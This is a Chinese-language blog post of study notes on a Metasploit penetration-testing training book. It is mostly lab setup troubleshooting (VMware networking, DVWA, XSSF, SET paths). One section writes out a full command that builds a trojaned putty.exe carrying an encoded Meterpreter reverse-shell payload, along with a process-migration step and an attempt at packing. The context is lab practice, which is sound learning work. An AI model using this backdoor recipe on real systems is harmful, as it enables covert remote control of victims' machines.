---
layout: post
title: "Metasploit渗透测试魔鬼训练营"
description: ""
category: [Metasploit]
tags: [Metasploit, Penetration]
---
{% include JB/setup %}



###记录一下学习过程中遇到的问题

* OSX 10.10下配置VMware Fusion虚拟网络环境

	打开`/Library/Preferences/VMware Fusion/networking`

修改对应行

	answer VNET_8_HOSTONLY_SUBNET 10.10.10.0



* 3.5 DB

* 4.2.5 wXf

* 4.3.1 DVWA如何打开
	
	在带有浏览器的测试机打开 http://www.dvssc.com/dvwa (http://10.10.10.129/dvma)
	
	并以`admin` `admin`登陆

* 4.3.2 XSSF配置

	下载[XSSF](https://code.google.com/p/xssf/downloads/list)
	
	合并/XSSF中的data、lib、modules、plugins至

	BT5: `/opt/metasploit/apps/pro/msf3/`

	Kali2: `/usr/share/metasploit-framework/`
	
* 7.3.3 木马制作

该命令在BT5会报错

	msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.10.128 LPORT=80 R | msfencode -t exe -x ~/Desktop/putty.exe -k -o ~/Desktop/putty_backdoor.exe -e x86/shikata_ga_nai -c 5

`[-] x86/shikata_ga_nai failed: Not enough room for new section header`

`[-] No encoders succeeded.`

Google无果，但是换kali就好了。。。

`run migrate -n explorer.exe`

upx加壳失败。。。

* 7.4.1 SET
	
	BT5: `/pentest/exploits/set/set`
	
	Kali2: `/usr/share/set/setoolkit`	

* 7.6.2 官方网盘里并没有`hak5_usb_hacksaw_ver0.2poc.rar`的下载，Google了半天也找不到。。。

* 




